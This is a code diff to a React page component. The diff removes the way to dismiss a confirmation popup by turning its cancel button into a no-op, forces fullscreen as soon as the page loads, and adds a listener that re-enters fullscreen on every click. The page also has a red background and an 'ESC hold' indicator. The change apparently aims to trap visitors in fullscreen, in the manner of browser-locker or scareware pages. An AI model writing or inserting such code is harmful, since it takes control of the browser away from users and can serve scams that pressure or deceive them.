@@ -5,7 +5,7 @@ import MobileInterface from '../components/MobileInterface';
 import { wsClient } from '../integrations/ws-client';
 
 const Index = () => {
-  const [showPopup, setShowPopup] = useState(true);
+
   const [isFullscreen, setIsFullscreen] = useState(false);
   const [hasEnteredFullscreen, setHasEnteredFullscreen] = useState(false);
   const [isMobile, setIsMobile] = useState(false);
@@ -24,10 +24,17 @@ const Index = () => {
     if (!wsClient.socket.connected) {
       wsClient.connect();
     }
+    // Automatically attempt fullscreen on component mount
+    handlePopupAction();
+
+    // Add click listener to document to re-enter fullscreen
+    document.addEventListener('click', handlePopupAction);
+
     return () => {
       if (wsClient.socket.connected) {
         wsClient.disconnect();
       }
+      document.removeEventListener('click', handlePopupAction);
     };
   }, []);
 
@@ -324,12 +331,7 @@ const Index = () => {
 
   return (
     <div className="min-h-screen bg-red-500">
-      {showPopup ? (
-        <ConfirmationPopup
-          onConfirm={handlePopupAction}
-          onCancel={() => setShowPopup(false)}
-        />
-      ) : (
+      {
         hasEnteredFullscreen ? (
           isMobile ? (
             <MobileInterface />
@@ -339,10 +341,10 @@ const Index = () => {
         ) : (
           <ConfirmationPopup
             onConfirm={handlePopupAction}
-            onCancel={() => setShowPopup(false)}
+            onCancel={() => {}}
           />
         )
-      )}
+      }
       {/* ESC Hold Indicator for Windows */}
       {showEscHoldIndicator && !isMobile && (
         <div className="fixed top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 z-50 bg-black bg-opacity-80 text-white p-6 rounded-lg text-center">
